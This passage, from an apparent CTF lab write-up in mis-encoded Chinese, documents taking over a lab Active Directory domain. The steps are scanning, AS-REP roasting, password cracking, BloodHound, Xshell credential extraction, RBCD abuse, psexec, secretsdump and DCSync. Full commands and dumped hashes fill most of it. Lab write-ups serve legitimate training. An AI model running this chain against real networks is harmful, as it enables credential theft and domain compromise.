æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-05-05 11:28:42] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-05-05 11:28:42] [INFO] CIDR èŒƒå›´: 172.22.60.0-172.22.60.255[2025-05-05 11:28:42] [INFO] ç”Ÿæˆ IP èŒƒå›´: 172.22.60.0.%! d(string = 172.22.60.255) - %! s(MISSING).%! d(MISSING)[2025-05-05 11:28:42] [INFO] è§£æ CIDR 172.22.60.52/24 -&gt; IP èŒƒå›´ 172.22.60.0-172.22.60.255[2025-05-05 11:28:42] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[2025-05-05 11:28:42] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-05-05 11:28:42] [SUCCESS] ç›®æ ‡ 172.22.60.52 å­˜æ´» (ICMP)[2025-05-05 11:28:42] [SUCCESS] ç›®æ ‡ 172.22.60.8 å­˜æ´» (ICMP)[2025-05-05 11:28:42] [SUCCESS] ç›®æ ‡ 172.22.60.15 å­˜æ´» (ICMP)[2025-05-05 11:28:42] [SUCCESS] ç›®æ ‡ 172.22.60.42 å­˜æ´» (ICMP)[2025-05-05 11:28:45] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4[2025-05-05 11:28:45] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.8:88[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.8:389[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.42:139[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.15:139[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.8:139[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.42:135[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.15:135[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.8:135[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.42:445[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.15:445[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.8:445[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.52:22[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.52:80[2025-05-05 11:28:46] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.52:22 =&gt; [ssh] ç‰ˆæœ¬: 8.9p1 Ubuntu 3ubuntu0.3 äº§å“: OpenSSH ç³»ç»Ÿ: Linux ä¿¡æ¯: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3.][2025-05-05 11:28:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.8:88 =&gt;[2025-05-05 11:28:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.42:139 =&gt; Banner: [.][2025-05-05 11:28:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.8:389 =&gt;[2025-05-05 11:28:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.15:139 =&gt; Banner: [.][2025-05-05 11:28:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.8:139 =&gt; Banner: [.][2025-05-05 11:28:51] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.42:445 =&gt;[2025-05-05 11:28:51] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.15:445 =&gt;[2025-05-05 11:28:51] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.8:445 =&gt;[2025-05-05 11:28:51] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.52:80 =&gt; [http][2025-05-05 11:29:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.42:135 =&gt;[2025-05-05 11:29:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.15:135 =&gt;[2025-05-05 11:29:51] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.8:135 =&gt;[2025-05-05 11:29:51] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 13[2025-05-05 11:29:51] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-05-05 11:29:51] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-05-05 11:29:51] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.60.8ä¸»æœºå: DCå‘ç°çš„ç½‘ç»œæ¥å£: IPv4 åœ°å€: â””â”€ 172.22.60.8 â””â”€ 169.254.24.199[2025-05-05 11:29:51] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.60.15ä¸»æœºå: PC1å‘ç°çš„ç½‘ç»œæ¥å£: IPv4 åœ°å€: â””â”€ 172.22.60.15 â””â”€ 169.254.125.121[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.42 XIAORANG\\FILESERVER[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.15 XIAORANG\\PC1[2025-05-05 11:29:51] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.60.42ä¸»æœºå: Fileserverå‘ç°çš„ç½‘ç»œæ¥å£: IPv4 åœ°å€: â””â”€ 172.22.60.42 â””â”€ 169.254.128.155[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.8 DC: XIAORANG\\DC[2025-05-05 11:29:51] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.60.52 çŠ¶æ€ç : 200 é•¿åº¦: 5867 æ ‡é¢˜: éœ„å£¤ç¤¾åŒº 123456789101112131415161718192021222324252627282930root@web01:/var/www/html# cat config.php&lt;?php return array ( &#x27;debug&#x27; =&gt; false, &#x27;database&#x27; =&gt; array ( &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;, &#x27;host&#x27; =&gt; &#x27;localhost&#x27;, &#x27;port&#x27; =&gt; 3306, &#x27;database&#x27; =&gt; &#x27;flarum&#x27;, &#x27;username&#x27; =&gt; &#x27;root&#x27;, &#x27;password&#x27; =&gt; &#x27;Mysql@root123&#x27;, &#x27;charset&#x27; =&gt; &#x27;utf8mb4&#x27;, &#x27;collation&#x27; =&gt; &#x27;utf8mb4_unicode_ci&#x27;, &#x27;prefix&#x27; =&gt; &#x27;flarum_&#x27;, &#x27;strict&#x27; =&gt; false, &#x27;engine&#x27; =&gt; &#x27;InnoDB&#x27;, &#x27;prefix_indexes&#x27; =&gt; true, ), &#x27;url&#x27; =&gt; &#x27;http://&#x27;.$_SERVER[&#x27;HTTP_HOST&#x27;], &#x27;paths&#x27; =&gt; array ( &#x27;api&#x27; =&gt; &#x27;api&#x27;, &#x27;admin&#x27; =&gt; &#x27;admin&#x27;, ), &#x27;headers&#x27; =&gt; array ( &#x27;poweredByHeader&#x27; =&gt; true, &#x27;referrerPolicy&#x27; =&gt; &#x27;same-origin&#x27;, ),); æ‹¿åˆ°æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç äº†ï¼Œè¿›è¡Œä¸€æ³¢ä¿¡æ¯æœé›† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251mysql &gt; select email from flarum_users;+----------------------------+| email |+----------------------------+| administrator@xiaorang.lab || chenbin@xiaorang.lab || chenbo@xiaorang.lab || chenchao@xiaorang.lab || chenchen@xiaorang.lab || chenfang@xiaorang.lab || chenhong@xiaorang.lab || chenhua@xiaorang.lab || chenjie@xiaorang.lab || chenjing@xiaorang.lab || chenjuan@xiaorang.lab || chenjun@xiaorang.lab || chenlei@xiaorang.lab || chenli@xiaorang.lab || chenlin@xiaorang.lab || chenling@xiaorang.lab || chenlong@xiaorang.lab || chenmin@xiaorang.lab || chenpeng@xiaorang.lab || chenping@xiaorang.lab || chenqiang@xiaorang.lab || chentao@xiaorang.lab || chenwei@xiaorang.lab || chenyan@xiaorang.lab || chenying@xiaorang.lab || chenyong@xiaorang.lab || chenyun@xiaorang.lab || gaofeng@xiaorang.lab || huangmin@xiaorang.lab || huangyong@xiaorang.lab || libin@xiaorang.lab || libing@xiaorang.lab || libo@xiaorang.lab || lichao@xiaorang.lab || lidan@xiaorang.lab || lifang@xiaorang.lab || lifeng@xiaorang.lab || ligang@xiaorang.lab || lihao@xiaorang.lab || lihong@xiaorang.lab || lihua@xiaorang.lab || lijia@xiaorang.lab || lijian@xiaorang.lab || lijie@xiaorang.lab || lijing@xiaorang.lab || lijuan@xiaorang.lab || lijun@xiaorang.lab || likai@xiaorang.lab || lilei@xiaorang.lab || lili@xiaorang.lab || liliang@xiaorang.lab || lilin@xiaorang.lab || liling@xiaorang.lab || lilong@xiaorang.lab || limin@xiaorang.lab || liming@xiaorang.lab || lina@xiaorang.lab || lining@xiaorang.lab || lipeng@xiaorang.lab || liping@xiaorang.lab || liqian@xiaorang.lab || liqiang@xiaorang.lab || liqin@xiaorang.lab || lishuai@xiaorang.lab || litao@xiaorang.lab || liubin@xiaorang.lab || liubing@xiaorang.lab || liuchang@xiaorang.lab || liuchao@xiaorang.lab || liudan@xiaorang.lab || liufang@xiaorang.lab || liufei@xiaorang.lab || liufeng@xiaorang.lab || liugang@xiaorang.lab || liuhao@xiaorang.lab || liuhua@xiaorang.lab || liuhuan@xiaorang.lab || liuhui@xiaorang.lab || liujia@xiaorang.lab || liujing@xiaorang.lab || liujun@xiaorang.lab || liukai@xiaorang.lab || liulei@xiaorang.lab || liuli@xiaorang.lab || liuling@xiaorang.lab || liumei@xiaorang.lab || liumin@xiaorang.lab || liuming@xiaorang.lab || liuna@xiaorang.lab || liupeng@xiaorang.lab || liuping@xiaorang.lab || liuqian@xiaorang.lab || liuqiang@xiaorang.lab || liuqin@xiaorang.lab || liushuai@xiaorang.lab || liutao@xiaorang.lab || liuwei@xiaorang.lab || liuxia@xiaorang.lab || liuxin@xiaorang.lab || liuyan@xiaorang.lab || liuying@xiaorang.lab || liuyong@xiaorang.lab || liuyun@xiaorang.lab || liwei@xiaorang.lab || liwen@xiaorang.lab || lixiang@xiaorang.lab || lixin@xiaorang.lab || lixue@xiaorang.lab || liyan@xiaorang.lab || liyang@xiaorang.lab || liying@xiaorang.lab || liyong@xiaorang.lab || liyun@xiaorang.lab || machao@xiaorang.lab || sunwei@xiaorang.lab || wangbin@xiaorang.lab || wangbing@xiaorang.lab || wangbo@xiaorang.lab || wangchao@xiaorang.lab || wangcheng@xiaorang.lab || wangdan@xiaorang.lab || wangdong@xiaorang.lab || wangfang@xiaorang.lab || wanggang@xiaorang.lab || wanghao@xiaorang.lab || wanghua@xiaorang.lab || wanghuan@xiaorang.lab || wanghui@xiaorang.lab || wangjian@xiaorang.lab || wangjing@xiaorang.lab || wangjuan@xiaorang.lab || wangkai@xiaorang.lab || wangkun@xiaorang.lab || wanglei@xiaorang.lab || wangli@xiaorang.lab || wangliang@xiaorang.lab || wanglin@xiaorang.lab || wangling@xiaorang.lab || wanglong@xiaorang.lab || wanglu@xiaorang.lab || wangmei@xiaorang.lab || wangmin@xiaorang.lab || wangming@xiaorang.lab || wangna@xiaorang.lab || wangning@xiaorang.lab || wangping@xiaorang.lab || wangqian@xiaorang.lab || wangqiang@xiaorang.lab || wangqin@xiaorang.lab || wangrong@xiaorang.lab || wangrui@xiaorang.lab || wangtao@xiaorang.lab || wangting@xiaorang.lab || wangwei@xiaorang.lab || wangxia@xiaorang.lab || wangxin@xiaorang.lab || wangxu@xiaorang.lab || wangxue@xiaorang.lab || wangyan@xiaorang.lab || wangying@xiaorang.lab || wangyong@xiaorang.lab || wangyu@xiaorang.lab || wangyun@xiaorang.lab || xumin@xiaorang.lab || xuwei@xiaorang.lab || yangbin@xiaorang.lab || yangbo@xiaorang.lab || yangchao@xiaorang.lab || yangfang@xiaorang.lab || yanghong@xiaorang.lab || yanghua@xiaorang.lab || yangjie@xiaorang.lab || yangjing@xiaorang.lab || yangjuan@xiaorang.lab || yangjun@xiaorang.lab || yangli@xiaorang.lab || yanglin@xiaorang.lab || yangling@xiaorang.lab || yangliu@xiaorang.lab || yangmei@xiaorang.lab || yangming@xiaorang.lab || yangping@xiaorang.lab || yangtao@xiaorang.lab || yangwei@xiaorang.lab || yangxue@xiaorang.lab || yangyan@xiaorang.lab || yangyang@xiaorang.lab || yangyong@xiaorang.lab || zhangbin@xiaorang.lab || zhangbo@xiaorang.lab || zhangchao@xiaorang.lab || zhangdan@xiaorang.lab || zhangfan@xiaorang.lab || zhangfei@xiaorang.lab || zhangfeng@xiaorang.lab || zhanghao@xiaorang.lab || zhanghong@xiaorang.lab || zhanghua@xiaorang.lab || zhanghui@xiaorang.lab || zhangjian@xiaorang.lab || zhangjie@xiaorang.lab || zhangjing@xiaorang.lab || zhangjun@xiaorang.lab || zhanglei@xiaorang.lab || zhangli@xiaorang.lab || zhangliang@xiaorang.lab || zhanglin@xiaorang.lab || zhangling@xiaorang.lab || zhanglong@xiaorang.lab || zhangmei@xiaorang.lab || zhangmin@xiaorang.lab || zhangming@xiaorang.lab || zhangnan@xiaorang.lab || zhangning@xiaorang.lab || zhangpeng@xiaorang.lab || zhangping@xiaorang.lab || zhangqian@xiaorang.lab || zhangqiang@xiaorang.lab || zhangqin@xiaorang.lab || zhangrong@xiaorang.lab || zhangrui@xiaorang.lab || zhangshuai@xiaorang.lab || zhangtao@xiaorang.lab || zhangting@xiaorang.lab || zhangwei@xiaorang.lab || zhangwen@xiaorang.lab || zhangxia@xiaorang.lab || zhangxin@xiaorang.lab || zhangxue@xiaorang.lab || zhangyan@xiaorang.lab || zhangying@xiaorang.lab || zhangyong@xiaorang.lab || zhangyu@xiaorang.lab || zhangyun@xiaorang.lab || zhaojing@xiaorang.lab || zhaojun@xiaorang.lab || zhaoli@xiaorang.lab || zhaomin@xiaorang.lab || zhaowei@xiaorang.lab || zhaoyong@xiaorang.lab || zhoujie@xiaorang.lab || zhoujing@xiaorang.lab || zhouli@xiaorang.lab || zhoumin@xiaorang.lab || zhouwei@xiaorang.lab || zhouyong@xiaorang.lab |+----------------------------+ å°†é‚®ç®±å–å‡ºæ¥ 12â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# grep -E &quot; [^| ].*lab &quot; 1 -o &gt; 2 ç„¶åæ‰“ AS-REP Rroasting 123456â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.60.8 -usersfile 2....$krb5asrep$ 23 $wangyun@xiaorang.lab@XIAORANG.LAB:5addef2c40ec88e399e44de7ce033d96$ d6aaf3b1c9a159b341c3bae1a662aa8743446421b4cc6dce7eb9ef56c2f1b6be9a02803e6338077443b120df8460bd985b426021b7413698623d7230ecc39b3046b31a19f7e69f375d535b31fdb7fbf1ac06cbf094ad02de073712bc084678d63f1deb6a5347191cd97e69b6e26ab2a1cfa9e2146f4db57678c959ee7db72fc4f210558a410f75e38c48755eb151fac7dfd41c4c9ad6d05e050b815ec59cff9826fdb89f0222c5f8470759a50b5aeb87d50b99b6be487938bb7c1c9a10ae4e9c45b5759742f507863e35113f72cfeac3532f15ed584cac1a321e1f3e38fa3b90769f559cf8b5bebf50148825....$krb5asrep$ 23 $zhangxin@xiaorang.lab@XIAORANG.LAB:e392adc6c3ca1cd1e039b2c719fbd4de$ 7cf0bfb4a6e46c67fde82e5b3a35db844d3aac45f1b0b842a302386db4f5c7e5d8622a45ff4d0df17489382f47f15b3e268a320a202020838d37f6beeb0ff79bed8b1f3c6f52681a4caeee928c6cebb3bf9b536197e6c40787b1045ac7708d1fbc2e07316b875ccd0ef1f308ad323d21c6d30adf30b2d4287e121b140c579944b21a19329727e98162c05398112bdf14be295c71a373e9a3211efc7fbb5be1074aafc53bc56adc1aeb3c76238623ccc753160eac09b99ec0738b3c5a26b4cee39ea6a797503f87bb9eb36a543326b22f4be1e307b08734467296cd027d7bb5de0761dfcf811975fcf5dc8f8a å¯ä»¥è·‘å‡ºæ¥ä¸¤æ¡ï¼Œç„¶åç”¨ john çˆ†ç ´ 1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# john pass -w =/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 8 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusAdm12geC ($krb5asrep$ 23$wangyun@xiaorang.lab@XIAORANG.LAB) å¯ä»¥çˆ†ç ´å‡ºæ¥ wangyun çš„å¯†ç ï¼Œç„¶åç”¨ blood-hound è¿›è¡ŒåŸŸå†…ä¿¡æ¯æœé›† 1234567891011121314151617181920212223242526â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# bloodhound-python -u wangyun -p Adm12geC -d xiaorang.lab -dc DC.xiaorang.lab -c all --dns-tcp -ns 172.22.60.8 --auth-method ntlm --zipINFO: Found AD domain: xiaorang.labINFO: Connecting to LDAP server: DC.xiaorang.labINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 3 computersINFO: Connecting to LDAP server: DC.xiaorang.labINFO: Found 12 usersINFO: Found 52 groupsINFO: Found 2 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: fileserver.xiaorang.labINFO: Querying computer: PC1.xiaorang.labINFO: Querying computer: DC.xiaorang.labWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.INFO: Done in 00M 09SINFO: Compressing output into 20250504234223_bloodhound.zip å¯ä»¥å‘ç° zhangxin å±äº Acount Operatorsï¼Œå› æ­¤å¯¹åŸŸå†…éåŸŸæ§çš„æ‰€æœ‰æœºå™¨éƒ½å…·æœ‰ GenericAll æƒé™ï¼Œè€Œ FILESERVER æœºå™¨æœ‰ DCSyncï¼Œæ€è·¯å°±å¾ˆæ˜æ˜¾äº† é¦–å…ˆè¿œç¨‹æ¡Œé¢è¿æ¥ 172.22.60.15 å‘ç°æ¡Œé¢ä¸Šæœ‰ä¸€ä¸ª xshellï¼Œåˆ©ç”¨ å·¥å…· å°† xshell çš„å‡­è¯å¯¼å‡º 1234567891011121314151617181920212223PS C:\\Users\\wangyun\\Desktop &gt; .\\SharpXDecrypt.exeXshell å…¨ç‰ˆæœ¬å‡­è¯ä¸€é”®å¯¼å‡ºå·¥å…·!(æ”¯æŒ Xshell 7.0+ç‰ˆæœ¬)Author: 0pen1Github: https://github.com/JDArmy[!] WARNING: For learning purposes only, please delete it within 24 hours after downloading![*] Start GetUserPath.... UserPath: C:\\Users\\wangyun\\Documents\\NetSarang Computer\\7[*] Get UserPath Success ![*] Start GetUserSID.... Username: wangyun userSID: S-1-5-21-3535393121-624993632-895678587-1107[*] GetUserSID Success ! XSHPath: C:\\Users\\wangyun\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions\\SSH.xsh Host: 172.22.60.45 UserName: zhangxin Password: admin4qwY38cc Version: 7.1[*] read done æŠ“åˆ°äº† zhangxin çš„å¯†ç ï¼Œç„¶åæ‰“ RBCD 12345678910111213141516171819202122232425262728PS C:\\Users\\zhangxin\\Desktop &gt; Set-ExecutionPolicy Bypass -Scope Processæ‰§è¡Œç­–ç•¥æ›´æ”¹æ‰§è¡Œç­–ç•¥å¯å¸®åŠ©ä½ é˜²æ­¢æ‰§è¡Œä¸ä¿¡ä»»çš„è„šæœ¬ã€‚æ›´æ”¹æ‰§è¡Œç­–ç•¥å¯èƒ½ä¼šäº§ç”Ÿå®‰å…¨é£é™©ï¼Œå¦‚https:/go.microsoft.com/fwlink/?LinkID = 135170 ä¸­çš„ about_Execution_Policies å¸®åŠ©ä¸»é¢˜æ‰€è¿°ã€‚æ˜¯å¦è¦æ›´æ”¹æ‰§è¡Œç­–ç•¥?[Y] æ˜¯(Y) [A] å…¨æ˜¯(A) [N] å¦(N) [L] å…¨å¦(L) [S] æš‚åœ(S) [?] å¸®åŠ© (é»˜è®¤å€¼ä¸ºâ€œNâ€): YPS C:\\Users\\zhangxin\\Desktop &gt; import-module .\\Powermad.ps1PS C:\\Users\\zhangxin\\Desktop &gt; New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString &quot; 123456 &quot; -AsPlainText -Force)[+] Machine account test addedPS C:\\Users\\zhangxin\\Desktop &gt; import-module .\\powerview.ps1PS C:\\Users\\zhangxin\\Desktop &gt; Get-NetComputer test -Properties objectsidobjectsid---------S-1-5-21-3535393121-624993632-895678587-1117PS C:\\Users\\zhangxin\\Desktop &gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot; O: BAD:(A;; CCDCLCSWRPWPDTLOCRSDRCWDWO;;; S-1-5-21-3535393121-624993632-895678587-1117)&quot;PS C:\\Users\\zhangxin\\Desktop &gt; $SDBytes = New-Object byte[] ($ SD.BinaryLength)PS C:\\Users\\zhangxin\\Desktop &gt; $SD.GetBinaryForm($ SDBytes, 0)PS C:\\Users\\zhangxin\\Desktop &gt; Get-DomainComputer Fileserver| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verboseè¯¦ç»†ä¿¡æ¯: [Get-DomainSearcher] search string: LDAP://DC.xiaorang.lab/DC = xiaorang, DC = labè¯¦ç»†ä¿¡æ¯: [Get-DomainObject] Get-DomainObject filter string:(&amp;(|(distinguishedname = CN = FILESERVER, CN = Computers, DC = xiaorang, DC = lab)))è¯¦ç»†ä¿¡æ¯: [Set-DomainObject] Setting &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; to &#x27;1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 97 209185 210 96 165 64 37 123 248 98 53 93 4 0 0&#x27; for object &#x27;FILESERVER$&#x27;PS C:\\Users\\zhangxin\\Desktop &gt; ç„¶åä¿®æ”¹/etc/hosts 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# cat /etc/hosts127.0.0.1 localhost127.0.1.1 kali.kali kali# The following lines are desirable for IPv6 capable hosts:: 1 localhost ip6-localhost ip6-loopbackff02:: 1 ip6-allnodesff02:: 2 ip6-allrouters172.22.60.15 PC1.xiaorang.lab172.22.60.42 FILESERVER.xiaorang.lab ç„¶åç”³è¯·ç¥¨æ®å°±è¡Œäº† 123impacket-getST -dc-ip 172.22.60.8 xiaorang.lab/test\\$: 123456 -spn cifs/Fileserver.xiaorang.lab -impersonate administratorexport KRB5CCNAME = administrator.ccacheproxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk ä½†æ˜¯åé¢æˆ‘åˆå‘ç°ä¸€ç§æ›´ç®€å•çš„æ–¹æ³• 12345proxychains python3 addcomputer.py xiaorang.lab/zhangxin:&#x27;admin4qwY38cc&#x27; -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name &#x27;TEST2$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;proxychains python3 rbcd.py xiaorang.lab/zhangxin:&#x27;admin4qwY38cc&#x27; -dc-ip 172.22.60.8 -action write -delegate-to &#x27;Fileserver $&#x27; -delegate-from &#x27;TEST2$&#x27;proxychains python3 getST.py xiaorang.lab/&#x27;TEST2$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/Fileserver.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8 åé¢ä¹Ÿæ˜¯ 12export KRB5CCNAME = administrator.ccacheproxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk flag åœ¨ C:\\users\\administrator\\flag ä¸‹ FLAG02&amp;FLAG04æŠ“ä¸€ä¸‹ FILESERVER çš„å“ˆå¸Œ 1234567891011121314151617181920212223242526272829â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# secretsdump.py -k -no-pass FILESERVER.xiaorang.lab -dc-ip 172.22.60.8Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Service RemoteRegistry is in stopped state[*] Starting service RemoteRegistry[*] Target system bootKey: 0xef418f88c0327e5815e32083619efdf5[*] Dumping local SAM hashes (uid: rid: lmhash: nthash)Administrator: 500: aad3b435b51404eeaad3b435b51404ee: bd8e2e150f44ea79fff5034cad4539fc:::Guest: 501: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount: 503: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount: 504: aad3b435b51404eeaad3b435b51404ee: b40dda6fd91a2212d118d83e94b61b11:::[*] Dumping cached domain logon information (domain/username: hash)XIAORANG.LAB/Administrator: $DCC2$ 10240#Administrator#f9224930044d24598d509aeb1a015766[*] Dumping LSA Secrets[*] $MACHINE.ACCXIAORANG\\Fileserver$: plain_password_hex: 3000310078005b003b0049004e003500450067003e00300039003f0074006c00630024003500450023002800220076003c004b0057005e0063006b005100580024007300620053002e0038002c0060003e00420021007200230030003700470051007200640054004e0078006000510070003300310074006d006b004c002e002f0059003b003f0059002a005d002900640040005b0071007a0070005d004000730066006f003b0042002300210022007400670045006d0023002a002800330073002c00320063004400720032002f003d0078006a002700550066006e002f003a002a0077006f0078002e0066003300XIAORANG\\Fileserver$: aad3b435b51404eeaad3b435b51404ee: 951d8a9265dfb652f42e5c8c497d70dc:::[*] DPAPI_SYSTEMdpapi_machinekey: 0x15367c548c55ac098c599b20b71d1c86a2c1f610dpapi_userkey: 0x28a7796c724094930fc4a3c5a099d0b89dccd6d1[*] NL$KM 0000 8B 14 51 59 D7 67 45 80 9F 4A 54 4C 0D E1 D3 29 ..QY.gE..JTL...) 0010 3E B6 CC 22 FF B7 C5 74 7F E4 B0 AD E7 FA 90 0D &gt;..&quot;...t........ 0020 1B 77 20 D5 A6 67 31 E9 9E 38 DD 95 B0 60 32 C4 .w ..g1..8...`2. 0030 BE 8E 72 4D 0D 90 01 7F 01 30 AC D7 F8 4C 2B 4A ..rM.....0...L+JNL$KM: 8b145159d76745809f4a544c0de1d3293eb6cc22ffb7c5747fe4b0ade7fa900d1b7720d5a66731e99e38dd95b06032c4be8e724d0d90017f0130acd7f84c2b4a[*] Cleaning up...[*] Stopping service RemoteRegistry ç„¶åè¿›è¡Œ DcSync æ”»å‡»å¯¼å‡ºåŸŸæ§å“ˆå¸Œ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# secretsdump.py xiaorang.lab/&#x27;Fileserver$&#x27;:@172.22.60.8 -hashes &#x27;: 951d8a9265dfb652f42e5c8c497d70dc&#x27;Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied[*] Dumping Domain Credentials (domain\\uid: rid: lmhash: nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator: 500: aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b:::Guest: 501: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt: 502: aad3b435b51404eeaad3b435b51404ee: 98194d49adfe247020eaade4a3936d95:::chenfang: 1105: aad3b435b51404eeaad3b435b51404ee: 302b5743b0f7b3436591aedf550ded5b:::zhanghao: 1106: aad3b435b51404eeaad3b435b51404ee: 4c37e7a022daf856bfa2b16824696ab5:::wangyun: 1107: aad3b435b51404eeaad3b435b51404ee: 561d64b9a1c943db32810fb5586a4be9:::zhangwei: 1108: aad3b435b51404eeaad3b435b51404ee: 3d2f864635abb31f2546dc07cbcd2528:::wangkai: 1109: aad3b435b51404eeaad3b435b51404ee: d20a47a4529552805d96a24c3020384c:::yangyan: 1110: aad3b435b51404eeaad3b435b51404ee: 4f80f967fd586f4212bc264a7d1f6789:::zhangxin: 1111: aad3b435b51404eeaad3b435b51404ee: 38780e101b28bb9b9036fc3e2e4f35e6:::wangping: 1112: aad3b435b51404eeaad3b435b51404ee: 0adf6fb0f808be95d449e3b6c67b02dc:::DC$: 1000: aad3b435b51404eeaad3b435b51404ee: 